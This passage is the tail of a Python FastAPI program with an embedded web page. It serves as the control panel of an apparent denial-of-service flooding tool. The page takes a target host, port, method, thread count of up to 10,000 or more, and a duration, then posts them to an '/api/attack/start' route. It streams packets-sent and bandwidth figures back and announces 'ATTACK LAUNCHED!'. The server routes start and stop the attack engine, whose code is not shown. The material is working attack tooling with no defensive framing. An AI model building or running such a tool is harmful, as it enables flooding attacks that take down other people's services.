
        function updateTheme(theme) {
            currentTheme = theme;
            if (theme === 'light') {
                document.body.style.background = '#f0f8ff';
                document.body.style.color = '#003366';
                document.querySelector('.container').style.background = 'rgba(255,255,255,0.95)';
                document.querySelector('.container').style.borderColor = '#0066cc';
                document.querySelector('.container').style.boxShadow = '0 0 60px rgba(0,102,204,0.2)';
                document.querySelector('h1').style.color = '#003366';
                document.querySelector('h1').style.textShadow = '0 0 30px #0066cc';
                document.querySelector('.sub').style.color = '#004488';
                els.themeToggle.textContent = '☀️';
            } else {
                document.body.style.background = '#0a0a0a';
                document.body.style.color = '#00ffcc';
                document.querySelector('.container').style.background = 'rgba(0,20,20,0.95)';
                document.querySelector('.container').style.borderColor = '#00ffcc';
                document.querySelector('.container').style.boxShadow = '0 0 60px rgba(0,255,204,0.2)';
                document.querySelector('h1').style.color = '#00ffcc';
                document.querySelector('h1').style.textShadow = '0 0 30px #00ffcc';
                document.querySelector('.sub').style.color = '#88ffdd';
                els.themeToggle.textContent = '🌙';
            }
            els.themeSelect.value = theme;
        }

        els.threadSelector.addEventListener('click', function(e) {
            const btn = e.target.closest('button');
            if (!btn) return;
            const val = btn.dataset.value;
            els.threadSelector.querySelectorAll('button').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            if (val === 'custom') {
                els.customThreadInput.style.display = 'block';
                selectedThreads = parseInt(els.customThreadInput.value) || 10000;
            } else {
                els.customThreadInput.style.display = 'none';
                selectedThreads = parseInt(val);
            }
        });

        els.customThreadInput.addEventListener('input', function() {
            selectedThreads = parseInt(this.value) || 10000;
            els.threadSelector.querySelectorAll('button').forEach(b => b.classList.remove('active'));
            document.querySelector('#customThreadBtn').classList.add('active');
        });

        els.langSelect.addEventListener('change', function() { updateLang(this.value); });
        els.themeSelect.addEventListener('change', function() { updateTheme(this.value); });
        els.themeToggle.addEventListener('click', function() {
            updateTheme(currentTheme === 'dark' ? 'light' : 'dark');
        });
        els.bwSlider.addEventListener('input', function() {
            updateBwLabel(parseInt(this.value), currentLang);
        });

        const wsProto = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
        const ws = new WebSocket(wsProto + window.location.host + '/ws/stats');
        ws.onmessage = function(e) {
            const data = JSON.parse(e.data);
            if (data.type === 'stats') {
                const s = data.data;
                els.packets.textContent = (s.packets_sent || 0).toLocaleString();
                els.rate.textContent = Math.round(s.rate || 0);
                els.bandwidth.textContent = (s.bandwidth || 0).toFixed(1) + ' Mbps';
                els.failed.textContent = (s.failed || 0).toLocaleString();
                els.elapsed.textContent = Math.round(s.elapsed || 0) + 's';
                els.limit.textContent = (s.bandwidth_limit || 0) + ' Mbps';
                els.cpu.textContent = (s.cpu_percent || 0).toFixed(0) + '%';
                els.ram.textContent = (s.ram_percent || 0).toFixed(0) + '%';
                els.procThreads.textContent = s.process_threads || 0;
                const t = LANG[currentLang] || LANG['en'];
                els.status.innerHTML = '🔴 ' + t.attacking;
                els.status.style.color = '#ff4444';
            } else {
                const t = LANG[currentLang] || LANG['en'];
                els.status.innerHTML = '🟢 ' + t.idle;
                els.status.style.color = '#00ff88';
            }
        };

        els.startBtn.addEventListener('click', async function() {
            const config = {
                target: els.target.value,
                port: parseInt(els.port.value) || 80,
                method: els.method.value,
                threads: selectedThreads,
                duration: parseInt(els.duration.value) || 300,
                bandwidth_limit: parseInt(els.bwSlider.value) || 0,
                use_proxy: false,
                lang: currentLang
            };
            const resp = await fetch('/api/attack/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(config)
            });
            if (resp.ok) {
                alert('🔥 ATTACK LAUNCHED!');
            } else {
                const err = await resp.json();
                alert('Error: ' + (err.detail || 'Unknown'));
            }
        });

        els.stopBtn.addEventListener('click', async function() {
            await fetch('/api/attack/stop', {method: 'POST'});
            alert('⛔ Attack stopped');
        });

        updateLang('en');
        updateTheme('dark');
    </script>
</body>
</html>
"""


# ========================== API ROUTES ==========================
@app.get("/", response_class=HTMLResponse)
async def index():
    return HTMLResponse(HTML_TEMPLATE)


@app.post("/api/attack/start")
async def start_attack(config: AttackConfig, background_tasks: BackgroundTasks):
    if engine.running:
        raise HTTPException(status_code=400, detail="Attack already running")
    background_tasks.add_task(engine.launch_attack, config)
    return {"message": "Attack started"}


@app.post("/api/attack/stop")
async def stop_attack():
    engine.stop_attack()
    return {"message": "Attack stopped"}


@app.get("/api/attack/status")
async def attack_status():
    if engine.running:
        return engine.get_status()
    return {"running": False}


@app.websocket("/ws/stats")
async def websocket_stats(websocket: WebSocket):
    await websocket.accept()
    try:
        while True:
            if engine.running:
                await websocket.send_json({"type": "stats", "data": engine.get_status()})
            else:
                await websocket.send_json({"type": "idle"})
            await asyncio.sleep(0.5)
    except WebSocketDisconnect:
        logger.info("WebSocket disconnected")
    except Exception as e:
        logger.error(f"WebSocket error: {e}")


# ========================== MAIN ==========================
if __name__ == "__main__":
    uvicorn.run(app, host="0.0.0.0", port=8000)
